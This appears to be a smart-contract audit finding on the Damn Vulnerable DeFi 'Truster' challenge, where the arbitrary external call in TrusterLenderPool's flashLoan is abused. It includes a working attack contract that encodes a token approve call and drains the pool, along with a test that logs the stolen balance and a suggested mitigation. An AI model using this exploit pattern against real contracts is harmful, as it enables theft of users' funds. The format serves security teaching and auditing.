## Critical Severity Issues

### [C-1] Arbitrary External Call Injection `TrusterLenderPool::flashLoan`

**Description**: The `TrusterLenderPool` protocol provides flash loans to anyone. A malicious user can exploit the `target.functionCall(data)` by passing crafted calldata that invokes the `approve` function of the DVT token. This allows the attacker to approve themselves to spend all tokens held by the pool and subsequently drain the entire balance.

```javascript
function flashLoan(uint256 amount, address borrower, address target, bytes calldata data) external nonReentrant returns (bool) {
        uint256 balanceBefore = token.balanceOf(address(this));

        token.transfer(borrower, amount);

@>      target.functionCall(data);

        if (token.balanceOf(address(this)) < balanceBefore) {
            revert RepayFailed();
        }

        return true;
    }
```

**Impact**: Malicious user takes the advantage of external call and make a call data which under the hood approve all the target tokens of `TrusterLenderPool`.

Attack Contract:

```javascript

 {DamnValuableToken} from "../src/DamnValuableToken.sol";

contract Target {

    DamnValuableToken public token;
    TrusterLenderPool public pool;

    address public attacker;

    constructor(
        DamnValuableToken _token,
        TrusterLenderPool _pool,
        address _attacker
    ) {
        token = _token;
        pool = _pool;
        attacker = _attacker;
    }

    function attack() external {
     uint256 poolBalance = token.balanceOf(address(pool)); // 1 million DVTs
      
      pool.flashLoan(
            0,
            address(this),
            address(token),
@>         abi.encodeWithSelector(token.approve.selector, address(this), poolBalance)
        );

        // Drain the funds
        token.transferFrom(address(pool), attacker, poolBalance);
    }
}

```

**Proof of Concept**:

1. Attacker passes malicious calldata.
2. The calldata contains the `approve` selector, granting the attacker permission to spend all of the pool's tokens.
3. Calls `flashLoan` with `amount = 0` to bypass repayment logic.
4. Executes `transferFrom` to drain all tokens from the pool.
5. Pool loses all funds.

**Proof of Code**:

```javascript
function testStealAllPoolFunds() public {
        console2.log( "Pool balance before : ", token.balanceOf(address(trusterLenderPool))); // 1000000000000000000000000
        console2.log( "Attacker balance before : ", token.balanceOf(target.attacker())); // 0

        target.attack(); // attack

        console2.log("Pool balance After : ", token.balanceOf(address(trusterLenderPool))); // 0
        console2.log("Target balance After : ", token.balanceOf(target.attacker())); // 1000000000000000000000000
    }
```

**Recommended Mitigation**: Restrict which contract addresses and function selectors can be called via the `target.functionCall(data)` pattern. Avoid allowing arbitrary low-level calls from user input. Consider removing this flexibility entirely if not strictly necessary.
